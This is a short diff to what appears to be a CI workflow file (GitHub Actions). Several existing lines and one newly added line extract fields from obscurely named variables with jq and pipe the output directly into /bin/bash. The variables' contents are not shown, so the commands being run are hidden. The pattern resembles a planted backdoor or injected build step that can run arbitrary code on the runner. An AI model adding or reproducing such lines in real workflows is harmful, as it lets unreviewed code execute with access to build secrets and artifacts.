@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$y774" | jq -r .yl2 | /bin/bash
           printf '%s' "$e75" | jq -r .ecsc21 | /bin/bash
           echo $inexi00 | jq -r .kqo22 | /bin/bash
+          echo $ioade45 | jq -r .ttq53 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
